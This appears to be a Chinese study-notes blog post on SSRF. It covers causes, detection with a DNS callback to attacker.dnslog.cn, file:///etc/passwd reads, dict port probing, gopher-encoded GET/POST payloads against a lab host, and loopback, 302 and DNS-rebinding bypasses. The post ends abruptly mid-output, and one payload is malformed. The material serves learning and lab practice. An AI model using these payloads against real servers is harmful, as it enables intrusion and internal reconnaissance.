---
layout: post
title: "ssrf总结"
date: 2025-03-14 07:50:57 +0800
description: "第一次DNS解析的IP设为合法IP来绕过host合法性检测，第二次DNS解析时更换URL对应的IP变为内网IP，在TTL结束、缓存失效之后，重新访问此URL就能获取被更换的IP，就能使用SSRF访问内网。第一次DNS解析的IP设为合法IP来绕过host合法性检测，第二次DNS解析时更换URL对应的IP变为内网IP，在TTL结束、缓存失效之后，重新访问此URL就能获取被更换的IP，就能使用SSRF访问内网。利用服务器两次解析同一个域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf。"
keywords: "ssrf总结"
categories: ['未分类']
tags: ['Ssrf', 'Linux']
artid: "146247843"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146247843
    alt: "ssrf总结"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146247843
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146247843
cover: https://bing.ee123.net/img/rand?artid=146247843
image: https://bing.ee123.net/img/rand?artid=146247843
img: https://bing.ee123.net/img/rand?artid=146247843
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     ssrf总结
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h3>
     <a id="SSRFServerSide_Request_Forgery_0">
     </a>
     SSRF(Server-Side Request Forgery，服务器端请求伪造)
    </h3>
    <p>
     <strong>
      ssrf的攻击目标
     </strong>
    </p>
    <p>
     是
     <code>
      从外网无法访问的内部系统
     </code>
     。
    </p>
    <p>
     <strong>
      漏洞成因
     </strong>
    </p>
    <p>
     服务器端提供了能从其他服务器应用获取数据的功能，并且对目标地址没有做过滤与限制。
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250211184934779.png&amp;pos_id=img-jrxUY9P2-1741909831955"/>
    </p>
    <p>
     导致漏洞产生的相关函数：
    </p>
    <pre><code class="prism language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>从用户指定的url中获得内容
<span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>用于实现对用户指定的url数据的获取
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>执行指定的curl会话
<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token class-name return-type">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</code></pre>
    <p>
     注意事项：
    </p>
    <pre><code>一般情况下PHP不会开启fopen的gopher wrapper
file_get_contents的gopher协议不能URL编码
file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
curl_exec() 默认不跟踪跳转，
file_get_contents() file_get_contents支持php://input协议
</code></pre>
    <h3>
     <a id="_35">
     </a>
     漏洞验证方式
    </h3>
    <p>
     1、查看请求资源是否在本地进行
    </p>
    <p>
     例如：http://www.xxx.com/a.php?image=URL，URL参数若是其他服务器地址就可能存在SSRF漏洞
    </p>
    <p>
     2、使用DNS外带进行验证
    </p>
    <p>
     工具：
     <code>
      Burp的Collaborator
     </code>
     、
     <code>
      dnslog.cn
     </code>
     、
     <code>
      ceye
     </code>
     等等
    </p>
    <p>
     提交指向特定DNS域名的URL，然后查看是否有DNS查询请求
    </p>
    <pre><code class="prism language-http">http://example.com/download?url=http://attacker.dnslog.cn
</code></pre>
    <p>
     3、利用回显差异
    </p>
    <p>
     提交不同的URL，观察服务器响应内容或时间差异。
    </p>
    <p>
     例如：
    </p>
    <pre><code class="prism language-http">http://example.com/download?url=http://127.0.0.1
http://example.com/download?url=http://nonexistent.local
</code></pre>
    <p>
     如果两次响应时间不同，就可能表示服务器正在尝试请求这些地址
    </p>
    <p>
     4、使用内网地址进行测试
    </p>
    <pre><code class="prism language-http">http://example.com/download?url=http://127.0.0.1:80
</code></pre>
    <h3>
     <a id="_72">
     </a>
     漏洞利用
    </h3>
    <pre><code>伪协议
file://    从文件系统中获取文件内容，如file:///etc/passwd

</code></pre>
    <p>
     查找内网主机(file)–&gt;端口探测(dict)–&gt;目录扫描(http)
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250211202751018.png&amp;pos_id=img-MPQqYG5d-1741909831956"/>
    </p>
    <h4>
     <a id="file_82">
     </a>
     file伪协议信息收集
    </h4>
    <p>
     <code>
      file://
     </code>
     从文件系统中获取文件内容，格式为 file://[文件路径]
    </p>
    <pre><code class="prism language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd		读取文件passwd</span>
file<span class="token punctuation">:</span><span class="token comment">///etc/hosts		显示当前操作系统网卡的ip，还可以得到网段，进行爆破，之后查看arp缓存表判断内网中存活的机器</span>
file<span class="token punctuation">:</span><span class="token comment">///proc/net/arp	显示arp缓存表(寻找内网其他主机)   </span>
file<span class="token punctuation">:</span><span class="token comment">///proc/net/flib_trie	显示当前网段路由信息</span>
</code></pre>
    <h4>
     <a id="dict_93">
     </a>
     dict伪协议信息收集
    </h4>
    <p>
     <code>
      dict://
     </code>
     字典服务协议，访问字典资源。格式为 dict://ip:port+/tcp/ip数据
    </p>
    <p>
     可以用来实现内网端口的探查、获取内网信息、爆破密码等。
    </p>
    <pre><code class="prism language-php">dict<span class="token punctuation">:</span><span class="token comment">//ip:端口</span>

可以使用bp同时爆破内网网段与端口
</code></pre>
    <h4>
     <a id="http_105">
     </a>
     http伪协议信息收集
    </h4>
    <p>
     http伪协议作用：常规url形式，允许通过HTTP 1.0的GET方法，以只读的方式访问文件或资源，可以用来扫描目录。CTF中常用于文件包含。格式为 http://ip:port/资源
    </p>
    <p>
     仍然是结合bp进行爆破资源。
    </p>
    <h4>
     <a id="gopher_111">
     </a>
     gopher伪协议
    </h4>
    <p>
     利用范围比较广：【get提交】【post提交】【redis】【Fastcgi】【sql】
    </p>
    <p>
     格式：
    </p>
    <pre><code>URL:gopher://host:port/&lt;gopher_path&gt;
</code></pre>
    <p>
     gopher请求不转发第一个字符，因此需要第一位加上填充位
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212102119609.png&amp;pos_id=img-5uncvXoq-1741909831956"/>
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212102745714.png&amp;pos_id=img-kIixrnGs-1741909831956"/>
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212103158013.png&amp;pos_id=img-Jqb7WumQ-1741909831956"/>
    </p>
    <p>
     实验环境
    </p>
    <pre><code class="prism language-php"><span class="token comment">//name.php</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'GET name='</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'POST name='</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <p>
     <strong>
      GET提交
     </strong>
     <br/>
     需要保留头部信息：
     <code>
      路径
     </code>
     与
     <code>
      目标地址Host:
     </code>
    </p>
    <p>
     例如：
    </p>
    <blockquote>
     <p>
      注意保留换行符，添加填充位
     </p>
     <p>
      可以直接去bp里面复制然后url编码两次(URL后面的部分，从_GET开始)之后发送数据包。因为经过两次发包，所以要url编码两次。
     </p>
     <p>
      空格：%20
     </p>
     <p>
      文化：%3f
     </p>
     <p>
      换行符：%0d%0A
     </p>
     <p>
      包结束的时候也要有回车
     </p>
    </blockquote>
    <pre><code class="prism language-php">gopher<span class="token punctuation">:</span><span class="token comment">//172.250.250.4:80/_GET /name.php?name=benben HTTP/1.1</span>
Host<span class="token punctuation">:</span> <span class="token number">172.250</span><span class="token number">.250</span><span class="token number">.4</span>

gopher<span class="token punctuation">:</span><span class="token comment">//172.250.250.4:80/_GET%20/name.php%3fname=benben%20HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0A</span>
或者使用bp两次url编码
gopher<span class="token punctuation">:</span><span class="token comment">//172.250.250.4:80/_%25%34%37%25%34%35%25%35%34%25%32%30%25%32%66%25%36%65%25%36%31%25%36%64%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30%25%33%66%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%36%32%25%36%35%25%36%65%25%36%32%25%36%35%25%36%65%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%32%25%33%35%25%33%30%25%32%65%25%33%32%25%33%35%25%33%30%25%32%65%25%33%34</span>
</code></pre>
    <p>
     <strong>
      POST提交
     </strong>
    </p>
    <p>
     需要保留头部信息：
     <code>
      POST
     </code>
     、
     <code>
      Host:
     </code>
     、
     <code>
      Content-Type:
     </code>
     、
     <code>
      Content-Length:
     </code>
    </p>
    <p>
     例如：
    </p>
    <pre><code class="prism language-php"><span class="token constant">POST</span> <span class="token operator">/</span>name<span class="token operator">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> <span class="token number">172.250</span><span class="token number">.250</span><span class="token number">.4</span>
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>frorm<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">11</span>
    
name<span class="token operator">=</span>benben
    
    
gopher<span class="token punctuation">:</span><span class="token comment">//172.250.250.4:80/_POST%20/name.php%2HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0AContent-Type:%20application/x-www-frorm-urlencoded%0d%0AContent-Length:%2011%0d%0A%0d%0Aname=benben</span>
或者使用bp两次url编码
gopher<span class="token punctuation">:</span><span class="token comment">//172.250.250.4:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%65%25%36%31%25%36%64%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%32%25%33%35%25%33%30%25%32%65%25%33%32%25%33%35%25%33%30%25%32%65%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%37%32%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%31%25%33%31%25%30%64%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%30%64%25%30%61%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%36%32%25%36%35%25%36%65%25%36%32%25%36%35%25%36%65</span>
</code></pre>
    <h4>
     <a id="_192">
     </a>
     回环地址绕过
    </h4>
    <p>
     有些时候会限制访问本地网站的内容，例如：
     <code>
      $_SEVER['REMOTE_ADD']='127.0.0.1'
     </code>
     ，看到
     <code>
      REMOTE_ADD地址
     </code>
     是
     <code>
      127.0.0.1
     </code>
     时候才会显示，而
     <code>
      127.0.0.1
     </code>
     会被限制。
    </p>
    <p>
     可以将127.0.0.1变形进行绕过
    </p>
    <pre><code>127.0.0.1							点分十进制
0b01111111000000000000000000000001	二进制
017700000001						八进制
0x7F000001							十六进制
2130706433							十进制(连续)
0177.0000.0000.0001					点分八进制
0x7F.0x00.0x00.0x01					点分十六进制
0x7F.0.0.1							也可以只转一个
</code></pre>
    <h4>
     <a id="302_211">
     </a>
     302重定向绕过
    </h4>
    <p>
     使用302重定向绕过ip限制，访问内网服务器。
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212154843424.png&amp;pos_id=img-jFRh6uMr-1741909831956"/>
    </p>
    <p>
     <strong>
      实验环境
     </strong>
    </p>
    <p>
     一台公网服务器
    </p>
    <pre><code class="prism language-php"><span class="token comment">//index.php</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location:http://127.0.0.1/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     不能使用python，要使用php
    </p>
    <pre><code class="prism language-php">php <span class="token operator">-</span><span class="token constant">S</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">7777</span>
</code></pre>
    <p>
     之后在有ssrf的网站curl这个url/flag.php
    </p>
    <h4>
     <a id="DNS_237">
     </a>
     DNS重绑定绕过
    </h4>
    <p>
     <strong>
      SSRF防御模式
     </strong>
    </p>
    <pre><code>1、解析目标URL，获取其Host
2、对Host进行DNS解析,获取Host所指向的ip地址
3、检查ip地址是否合法(如检测是否是私有Ip)
4、请求URL
5、如果有跳转，拿出URL跳转，执行1
</code></pre>
    <p>
     这种防御模式可以有效限制：直接访问内网ip、302跳转、xip.io/xip.name及短连接变换等URL变形、畸形URL、iframe攻击、ip进制转换等。
    </p>
    <p>
     针对这种防御，可以使用DNS重绑定攻击(DNS Rebinding Attack)。
    </p>
    <p>
     <strong>
      攻击原理
     </strong>
    </p>
    <p>
     利用服务器两次解析同一个域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf。
    </p>
    <blockquote>
     <p>
      第一次DNS解析：是对URL的host进行解析。
     </p>
     <p>
      第二次DNS解析：使用CURL发包的时候进行解析 。
     </p>
    </blockquote>
    <p>
     第一次DNS解析的IP设为合法IP来绕过host合法性检测，第二次DNS解析时更换URL对应的IP变为内网IP，在TTL结束、缓存失效之后，重新访问此URL就能获取被更换的IP，就能使用SSRF访问内网。
    </p>
    <p>
     整个过程对于浏览器来说整个过程都是访问同一域名，因此认为是安全的，这就导致绕过。
    </p>
    <blockquote>
     <p>
      DNS中的TTL机制：域名和IP绑定关系的Cache存活的最长时间。
     </p>
    </blockquote>
    <p>
     TTL最理想的设置为0，即在第一次解析之后，立马换为我们想要访问的内网ip，但有些公共DNS服务器，比如114.114.114.114还是会把记录进行缓存。
    </p>
    <p>
     在某些情况下，我们甚至可以对同一个域名设置两个A记录（一个内网、一个外网），随机访问两条记录中的一个，就会有概率成功。
    </p>
    <pre><code>https://lock.cmpxchg8b.com/rebinder.html
</code></pre>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212170403029.png&amp;pos_id=img-GtxcHGU1-1741909831956"/>
    </p>
    <p>
     最好在第一个填写公网地址，第二个填写内网地址。然后复制下面的url，拿到具有该漏洞的页面进行测试。例如：
    </p>
    <pre><code>http://deb7400b.7f000001.rbndr.us/flag.php
</code></pre>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212170616969.png&amp;pos_id=img-F2K5tRRp-1741909831956"/>
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212162745906.png&amp;pos_id=img-UGJ1yQwl-1741909831956"/>
    </p>
    <p>
     <img alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传" src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=D%3A%5CDocument%5C%E7%AC%94%E8%AE%B0%5COWASP%5C01%E6%B3%A8%E5%85%A5%E7%B1%BB%5Cssrf.assets%5Cimage-20250212162914668.png&amp;pos_id=img-2bYq1Den-1741909831956"/>
    </p>
    <h4>
     <a id="XXXE_293">
     </a>
     XXXE漏洞利用
    </h4>
    <hr/>
    <h3>
     <a id="URL_305">
     </a>
     与URL跳转的区别
    </h3>
    <p>
     区别：
    </p>
    <p>
     url跳转会让网页直接跳转到指定的网站
    </p>
    <p>
     ssrf不会跳转到其他网站，可回显的ssrf会在当前页面加载，盲的不会
    </p>
    <h3>
     <a id="SSRF_317">
     </a>
     SSRF的防御
    </h3>
    <p>
     1、解析目标URL，获取其Host
    </p>
    <p>
     2、解析Host，获取Host指向的ip地址
    </p>
    <h3>
     <a id="127001_325">
     </a>
     127.0.0.1绕过
    </h3>
    <p>
     <strong>
      302跳转绕过
     </strong>
    </p>
    <p>
     有一个sudo.cc的服务，当访问这个服务的时候，会自动重定向到127.0.0.1。
    </p>
    <p>
     绕过时使用
     <code>
      sudo.cc
     </code>
     代替127.0.0.1即可。
    </p>
    <p>
     或者使用
     <code>
      www.localtest.med
     </code>
     代替
    </p>
    <pre><code class="prism language-shell">root@VM-8-8-ubuntu:/<span class="token comment"># ping sudo.cc -c 4</span>
PING sudo.cc <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span> <span class="token number">56</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span> bytes of data.
<span class="token number">64</span> bytes from localhost <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.026</span> ms
<span class="token number">64</span> bytes from localhost <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.036</span> ms
<span class="token number">64</span> bytes from localhost <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.034</span> ms
<span class="token number">64</span> bytes from localhost <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span>: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.033</span> ms

--- sudo.cc <span class="token function">ping</span> statistics ---
<span class="token number">4</span> packets transmitted, <span class="token number">4</span> received, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 3052ms
rtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">0.026</span>/0.032/0.036/0.003 ms
</code></pre>
    <p>
     <strong>
      使用@绕过
     </strong>
    </p>
    <p>
     访问
     <code>
      http://notfound@127.0.0.1
     </code>
     于
     <code>
      http://127.0.0.1
     </code>
     的效果是一样的。无论notfound部分是什么都可以。
    </p>
    <p>
     <strong>
      使用
      <code>
       。
      </code>
      代替
      <code>
       .
      </code>
     </strong>
    </p>
    <p>
     这里没有成功
    </p>
    <p>
     <strong>
      省略0
     </strong>
    </p>
    <p>
     <code>
      http://127.0.0.1
     </code>
     变成
     <code>
      http://127.1
     </code>
    </p>
    <pre><code class="prism language-shell">root@VM-8-8-ubuntu:/<span class="token comment"># ping 127.1 -c 4</span>
PING <span class="token number">127.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span> <span class="token number">56</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span> bytes of data.
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.036</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.028</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.033</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.038</span> ms

--- <span class="token number">127.1</span> <span class="token function">ping</span> statistics ---
<span class="token number">4</span> packets transmitted, <span class="token number">4</span> received, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 3070ms
rtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">0.028</span>/0.033/0.038/0.003 ms
</code></pre>
    <p>
     <strong>
      进制转换
     </strong>
    </p>
    <p>
     将
     <code>
      127.0.0.1
     </code>
     转换成其他进制绕过检测
    </p>
    <pre><code class="prism language-shell">0177.0.0.1 //八进制
0x7f.0.0.1 //十六进制
<span class="token number">2130706433</span> //十进制

<span class="token number">127.0</span>.0.1							点分十进制
0b01111111000000000000000000000001	二进制
017700000001						八进制
0x7F000001							十六进制
<span class="token number">2130706433</span>							十进制<span class="token punctuation">(</span>连续<span class="token punctuation">)</span>
0177.0000.0000.0001					点分八进制
0x7F.0x00.0x00.0x01					点分十六进制
0x7F.0.0.1							也可以只转一个
</code></pre>
    <p>
     <strong>
      特殊0
     </strong>
    </p>
    <p>
     在windows下，0代表
     <code>
      0.0.0.0
     </code>
     ，在linux下，0代表
     <code>
      127.0.0.1
     </code>
    </p>
    <pre><code class="prism language-shell">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token number">4083</span><span class="token operator"><span class="token file-descriptor important">5</span>&gt;</span>ping <span class="token number">0</span>

正在 Ping <span class="token number">0.0</span>.0.0 具有 <span class="token number">32</span> 字节的数据:
PING：传输失败。常见故障。
PING：传输失败。常见故障。
PING：传输失败。常见故障。
PING：传输失败。常见故障。

<span class="token number">0.0</span>.0.0 的 Ping 统计信息:
    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">0</span>，丢失 <span class="token operator">=</span> <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">100</span>% 丢失<span class="token punctuation">)</span>，
</code></pre>
    <pre><code class="prism language-shell">root@VM-8-8-ubuntu:/<span class="token comment"># ping 0 -c 4</span>
PING <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span> <span class="token number">56</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span> bytes of data.
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.033</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.038</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.030</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.032</span> ms

--- <span class="token number">0</span> <span class="token function">ping</span> statistics ---
<span class="token number">4</span> packets transmitted, <span class="token number">4</span> received, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 3056ms
rtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">0.030</span>/0.033/0.038/0.003 ms
</code></pre>
    <p>
     也可以尝试4位都写0：
     <code>
      0.0.0.0
     </code>
    </p>
    <pre><code class="prism language-shell">root@VM-8-8-ubuntu:/<span class="token comment"># ping 0.0.0.0 -c 4</span>
PING <span class="token number">0.0</span>.0.0 <span class="token punctuation">(</span><span class="token number">127.0</span>.0.1<span class="token punctuation">)</span> <span class="token number">56</span><span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">)</span> bytes of data.
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.036</span> ms
<span class="token number">64</span> bytes from <span class="token number">127.0</span>.0.1: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.035</span> ms
